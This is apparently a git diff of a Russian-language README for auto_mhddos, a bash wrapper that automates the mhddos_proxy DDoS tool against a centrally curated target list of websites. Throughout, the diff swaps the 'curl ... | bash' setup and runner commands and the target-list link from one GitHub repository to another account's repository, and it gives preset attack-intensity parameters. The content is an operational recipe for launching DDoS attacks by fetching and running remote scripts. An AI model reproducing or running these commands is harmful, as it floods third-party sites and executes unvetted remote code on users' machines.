@@ -1,5 +1,5 @@
 ### ⭕️ Оперативный штаб Жнецов
-![photo_2022-03-17_23-39-03](https://user-images.githubusercontent.com/41838573/158963538-944690c4-83ea-4934-9a29-6eb8f1e61f3a.jpg)
+
 
 
 ### auto_mhddos - bash скрипт автоматизирующий [mhddos_proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy)
@@ -22,7 +22,7 @@ docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest [num_of_c
 
 
 ```shell
-curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/setup.sh | bash
+curl -s https://raw.githubusercontent.com/Maxssaf/target/main/setup.sh | bash
 ```
 
 Скрипт автоматически устанавливает git, python3, pip, mhddos_proxy, MHDDoS и все зависимости.
@@ -35,7 +35,7 @@ Bash скрипт работает в Linux и WSL (Windows Subsystem for Linux)
 
 
 ```shell
-curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash
+curl -s https://raw.githubusercontent.com/Maxssaf/target/main/runner.sh | bash
 ```
 
 Команды для разного железа: 
@@ -44,21 +44,21 @@ curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh |
 
 
 ```shell
-curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash -s -- 1 500 100
+curl -s https://raw.githubusercontent.com/Maxssaf/target/main/runner.sh | bash -s -- 1 500 100
 ```
 
 -- Среднее: 
 
 
 ```shell
-curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash -s -- 2 1000 200
+curl -s https://raw.githubusercontent.com/Maxssaf/target/main/runner.sh | bash -s -- 2 1000 200
 ```
 
 -- Быстрое: 
 
 
 ```shell
-curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash -s -- 2 2000 1000
+curl -s https://raw.githubusercontent.com/Maxssaf/target/main/runner.sh | bash -s -- 2 2000 1000
 ```
 
 Значение параметров на примере "bash -s -- 1 500 100":
@@ -70,7 +70,7 @@ curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh |
 100 - параметр --rpc в mhddos_proxy.
 
 # ❕Описание
-* Работает с курируемым админами единым списком [сайтов-целей](https://github.com/Aruiem234/auto_mhddos/blob/main/runner_targets).
+* Работает с курируемым админами единым списком [сайтов-целей](https://github.com/Maxssaf/target/blob/main/runner_targets).
 
 * База целей обновляется скриптом каждые 15 мин.
 
@@ -78,7 +78,7 @@ curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh |
 
 * По умолчанию скрипт запускает 1 копию mhddos_proxy. Если запустить больше, то каждая копия будет независимо выбирает цель из списка, повторяться они не будут. Для этого в списке должны быть хотя бы две цели. Если будет мало целей, лишние копии программы просто не будут запускаться.
 
-* Чтобы скрипт запускал больше копий mhddos_proxy, например 3, выполнить следующую команду `curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/setup.sh | bash | bash -s -- 3` Если в списке всего две цели, то запускать три копии нет смысла. Вреда правда тоже не будет. Скрипт запустит только необходимое кол-во копий.
+* Чтобы скрипт запускал больше копий mhddos_proxy, например 3, выполнить следующую команду `curl -s https://raw.githubusercontent.com/Maxssaf/target/main/setup.sh | bash | bash -s -- 3` Если в списке всего две цели, то запускать три копии нет смысла. Вреда правда тоже не будет. Скрипт запустит только необходимое кол-во копий.
 
 Теоретически все это позволяет запустить скрипт на ПК/vps и всю остальную работу (обновление, перезапуск) он будет делать самостоятельно.
 
